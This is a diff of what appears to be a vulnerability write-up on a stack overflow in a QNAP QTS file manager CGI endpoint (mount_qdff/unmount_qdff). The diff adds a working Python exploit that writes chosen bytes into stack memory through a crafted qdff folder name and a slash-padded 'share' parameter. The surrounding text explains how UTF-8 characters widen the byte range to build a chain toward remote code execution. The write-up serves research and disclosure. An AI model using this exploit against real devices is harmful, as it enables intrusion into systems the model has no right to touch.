@@ -61,7 +61,7 @@ In fact, at this point, some readers will wonder whether the StackOverflow of sp
 Here, at least two conditions must be met to trigger the StackOverflow: 
 
 1. The value in the share parameter must be the real mounted qdff folder. 
-2. The value in the share parameter must be constructed in a careful way to be large enough to trigger the stack overflow.
+2. The value in the share parameter must be constructed in a careful way to be large enough to trigger the StackOverflow.
 
 Fortunately, I found a careful construction method in the following text
 
@@ -80,7 +80,7 @@ Finally execute sprintf and successfully StackOverflow(If you add enough '/', 10
 ![/image/resources/1.png](/image/resources/qts_2.png)
 ![/image/resources/1.png](/image/resources/qts_3.png)
 
-Here parameters are formatted into a string by using the sprintf function. We can intuitively observe that the declared stack array v3 only has 2048 bytes, so we only need to input more bytes to cause stack overflow
+Here parameters are formatted into a string by using the sprintf function. We can intuitively observe that the declared stack array v3 only has 2048 bytes, so we only need to input more bytes to cause StackOverflow
 
 ![/image/resources/1.png](/image/resources/qts_9.png)
 
@@ -107,6 +107,7 @@ The premise of all the above operations is that the qdff has been mounted, becau
     ![/image/resources/1.png](/image/resources/qts_5.png)
 
 3.  Get the known current user sid, run belowing code and input the IP、Port、sid
+    (This is a simple version of payload, binary not included)
 
     ```py
     import requests
@@ -138,20 +139,83 @@ The premise of all the above operations is that the qdff has been mounted, becau
         print('Failed, please check if sid has expired')
     ```
 
+    Exp that writes any bytes from 0x00 to 0x7f to memory
+
+    ```py
+    import requests
+    from urllib.parse import quote
+    import json
+
+    host = '127.0.0.1'
+    port = 5000
+    sid = ''            #Your sid
+    path = '/Multimedia'        #The path you upload qdff foler
+    filename = 'Backup 1.qdff'  #The name of the qdff folder you uploaded
+
+    bytes_you_wanna_insert = b'\x01\x02\x03\x04'    #The bytes you wanna write into the memory, here is a example
+    backslash_nums = 123000                         #The number of backslash, related to the address you write your bytes, here is a example
+
+    def qts_req(data: str, api: str):
+        res = requests.post(
+            url = f"http://{host}:{port}/cgi-bin/filemanager/utilRequest.cgi?func={api}&sid={sid}", 
+            headers = {
+                'Host': f'{host}:{port}',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Content-Length': str(len(data))
+            },
+            data = data
+        )
+        return res.text
+
+    def mount(path: str, filename: str, bytes: bytes) -> bool:
+        '''
+        Mount the foler which name is bytes
+        '''
+        payload = '李'.encode('utf-8') + bytes      #'李' is just a placeholder and can theoretically be deleted.
+        res = qts_req(f'path={quote(path)}&file_name={quote(filename)}&custom_name={quote(payload)}&pwd=', 'mount_qdff')
+        try:
+            res1 = json.loads(res)
+            return res1['status'] == 1
+        except:
+            return False
+
+    def unmount(bytes: bytes):
+        '''
+        Unmount the foler which name is bytes
+        '''
+        payload = '李'.encode('utf-8') + bytes      #'李' is just a placeholder and can theoretically be deleted.
+        res = qts_req(f'share={quote(payload)}', 'unmount_qdff')
+        try:
+            res1 = json.loads(res)
+            return res1['status'] == 1
+        except:
+            return False
+
+    def StackOverflow():
+        print(mount(path, filename, bytes_you_wanna_insert))
+        unmount(b'/' * backslash_nums + bytes_you_wanna_insert)
+        print(unmount(bytes_you_wanna_insert))
+
+    StackOverflow()
+    ```
+
     ![/image/resources/1.png](/image/resources/qts_6.png)
+    
 
 ## [](#header-3)HARM: 
 
 A low privileged attacker could manipulate the qdff folder name to redirect the current function to the address corresponding to the qdff folder name, Even causing RCE
 
-A simple explain: if there is a mounted qdff folder which name is "asdf00000000##! ", and if the data "##! " being written at the return address of a certain function, then the function will jump to address 0x20212323
+A simple explanation: if there is a mounted qdff folder which name is "asdf00000000你!", and if the data "你!" being written at the return address of a certain function, then the function will jump to address 0x21a0bde4
 
 ```python
 #this is just a simple example, not applicable to any chip architecture
-'/' * 10000 + "asdf00000000##! "
+'/' * 100000 + "asdf00000000你!"
 ```
 
-Actually here you can input the utf-8 characters to simulate any byte between 0-255, such as the bytes of string ",你" is 0xa0bde42c. By combining utf-8 letters in this way, we can simulate the values ​​of most dwords.
+Actually here you can input any characters in the ASCII set to simulate any bytes between [0, 127], so how to simluate the higher bytes? use UTF-8 characters set
+
+I have to say that the design of being able to input characters in the ASCII character set and UTF-8 character set is the most outrageous thing. This design not only completely broadens the byte range required to construct an exploit chain (from the a-z A-Z 0-9 to the current range of almost 0x00 to 0xff), but also makes the StackOverflow vulnerability which basically does not cause any harm very easy to construct an exploit chain
 
 ## [](#header-3)Further Research
 
